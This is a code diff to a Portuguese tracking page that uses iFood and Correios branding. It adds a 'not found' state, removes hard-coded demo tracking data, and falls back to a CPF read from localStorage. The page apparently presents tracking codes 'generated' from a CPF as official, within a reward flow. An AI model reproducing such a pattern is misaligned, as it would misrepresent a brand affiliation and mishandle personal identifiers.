@@ -776,10 +776,14 @@
         <span style="font-size: 1.25rem; vertical-align: -2px; margin-right: 6px;">✅</span>
         <span>Código oficial gerado e sincronizado: <strong id="generated-code-text" style="font-family: monospace; font-size: 1.1rem; letter-spacing: 1px; color: #047857;"></strong>. Você pode copiar este código para consultas futuras ou continuar entrando diretamente pelo seu CPF!</span>
       </div>
+      <div id="tracking-not-found-banner" style="display: none; margin-top: 16px; background: #fff1f2; border: 1.5px solid #fda4af; border-radius: 12px; padding: 14px 18px; color: #9f1239; font-size: 0.92rem; line-height: 1.5;">
+        <span style="font-size: 1.1rem; vertical-align: -1px; margin-right: 6px;">⚠️</span>
+        <span id="tracking-not-found-text">Nenhum pedido localizado para este CPF ou código de rastreio. Confira os dados informados e consulte novamente.</span>
+      </div>
     </section>
 
     <!-- Tracking Result Container -->
-    <div id="tracking-result-area" class="tracking-result-wrap">
+    <div id="tracking-result-area" class="tracking-result-wrap" style="display: none;">
 
       <!-- Status Top Card -->
       <section class="tracking-status-card">
@@ -787,7 +791,7 @@
           <div class="tracking-code-block">
             <span class="tracking-code-label">Código de Objeto Rastreado</span>
             <div class="tracking-code-val">
-              <span id="track-code-display">BR849204918IF</span>
+              <span id="track-code-display">---</span>
               <button type="button" class="tracking-copy-btn" id="btn-copy-code" onclick="copyTrackingCode()">
                 <span>📋</span>
                 <span id="copy-btn-text">Copiar</span>
@@ -936,9 +940,9 @@
         </div>
         <div class="nfe-box">
           <div class="nfe-box-title">DESTINATÁRIO / REMETENTE</div>
-          <div class="nfe-box-val" id="nfe-modal-dest">Carlos Eduardo da Silva</div>
-          <div style="font-size: 0.75rem; color: #666;" id="nfe-modal-doc">CPF: ***.482.910-**</div>
-          <div style="font-size: 0.75rem; color: #666;" id="nfe-modal-addr">São Paulo - SP</div>
+          <div class="nfe-box-val" id="nfe-modal-dest">Carregando...</div>
+          <div style="font-size: 0.75rem; color: #666;" id="nfe-modal-doc">CPF: ***.***.***-**</div>
+          <div style="font-size: 0.75rem; color: #666;" id="nfe-modal-addr">Carregando endereço...</div>
         </div>
       </div>
 
@@ -1037,8 +1041,30 @@
     }
 
     function applyTrackingData(data) {
+      const resultArea = document.getElementById('tracking-result-area');
+      const generatedBanner = document.getElementById('tracking-code-generated-banner');
+      const generatedCodeText = document.getElementById('generated-code-text');
+      const notFoundBanner = document.getElementById('tracking-not-found-banner');
+      const notFoundText = document.getElementById('tracking-not-found-text');
+
+      if (!data || !data.ok || !data.foundInDatabase) {
+        currentTrackingData = null;
+        if (resultArea) resultArea.style.display = 'none';
+        if (generatedBanner) generatedBanner.style.display = 'none';
+        if (notFoundBanner) {
+          if (notFoundText) {
+            notFoundText.textContent = data?.error || 'Nenhum pedido localizado para este CPF ou código de rastreio. Confira os dados informados e tente novamente.';
+          }
+          notFoundBanner.style.display = 'block';
+        }
+        return;
+      }
+
+      if (notFoundBanner) notFoundBanner.style.display = 'none';
+      if (resultArea) resultArea.style.display = 'flex';
+
       currentTrackingData = data;
-      document.getElementById('track-code-display').textContent = data.code || 'BR849204918IF';
+      document.getElementById('track-code-display').textContent = data.code || '';
       document.getElementById('track-status-label').textContent = data.statusLabel || 'Em transferência para Unidade de Triagem';
       document.getElementById('track-eta-date').textContent = data.estimatedDays || '8 a 15 dias úteis';
       document.getElementById('track-carrier-display').textContent = data.carrier || 'Correios Sedex / iFood Logística Express';
@@ -1069,12 +1095,10 @@
       if (data.recipient) {
         document.getElementById('track-recipient-name').textContent = data.recipient.name || 'Parceiro iFood';
         document.getElementById('track-recipient-doc').textContent = data.recipient.document || '***.***.***-**';
-        document.getElementById('track-recipient-address').textContent = data.recipient.address || data.recipient.addressShort || 'Brasil';
+        document.getElementById('track-recipient-address').textContent = data.recipient.address || data.recipient.addressShort || 'Endereço em conferência';
       }
 
       // Check if code was auto-generated from CPF or matched
-      const generatedBanner = document.getElementById('tracking-code-generated-banner');
-      const generatedCodeText = document.getElementById('generated-code-text');
       if (generatedBanner) {
         if (data.isNewCodeGenerated || data.matchType === 'cpf' || data.matchType === 'cpf_generated') {
           if (generatedCodeText) generatedCodeText.textContent = data.code;
@@ -1097,7 +1121,7 @@
         document.getElementById('nfe-modal-cnpj').textContent = `CNPJ: ${data.company?.cnpj || '14.380.200/0001-21'}`;
         document.getElementById('nfe-modal-dest').textContent = data.recipient?.name || 'Parceiro iFood';
         document.getElementById('nfe-modal-doc').textContent = `CPF: ${data.recipient?.document || '***.***.***-**'}`;
-        document.getElementById('nfe-modal-addr').textContent = data.recipient?.address || `${data.recipient?.addressShort || 'São Paulo - SP'}`;
+        document.getElementById('nfe-modal-addr').textContent = data.recipient?.address || data.recipient?.addressShort || 'Endereço cadastrado';
       }
 
       // Email Support Link
@@ -1129,7 +1153,12 @@
         const data = await res.json();
         applyTrackingData(data);
       } catch (err) {
-        console.warn('Fallback tracking demo:', err);
+        console.warn('Erro ao consultar rastreio:', err);
+        applyTrackingData({
+          ok: false,
+          foundInDatabase: false,
+          error: 'Não foi possível consultar este código agora. Tente novamente em instantes.'
+        });
       } finally {
         if (submitBtn) {
           submitBtn.disabled = false;
@@ -1148,16 +1177,31 @@
       fetchTracking(val);
     }
 
+    function resolveLocalTrackingFallback() {
+      try {
+        const storedCode = String(localStorage.getItem('ifood_tracking_code') || '').trim();
+        if (storedCode) return storedCode;
+        const rawPersonal = localStorage.getItem('ifoodbag.personal');
+        if (rawPersonal) {
+          const parsed = JSON.parse(rawPersonal);
+          const cpf = String(parsed?.cpf || '').replace(/\D/g, '');
+          if (cpf.length === 11) return cpf;
+        }
+      } catch (_e) {}
+      return '';
+    }
+
     window.addEventListener('DOMContentLoaded', () => {
       const params = new URLSearchParams(window.location.search || '');
       const codeParam = params.get('codigo') || params.get('code') || params.get('id');
       const cpfParam = params.get('cpf') || params.get('doc');
       const prodParam = params.get('produto') || params.get('item') || params.get('reward') || resolveClientReward();
-      
-      const termToUse = cpfParam || codeParam || 'BR849204918IF';
+
+      const termToUse = cpfParam || codeParam || resolveLocalTrackingFallback();
+      if (!termToUse) return;
 
       const input = document.getElementById('tracking-input-code');
-      if (input && (cpfParam || codeParam)) input.value = cpfParam || codeParam;
+      if (input) input.value = termToUse;
 
       fetchTracking(termToUse, prodParam);
     });
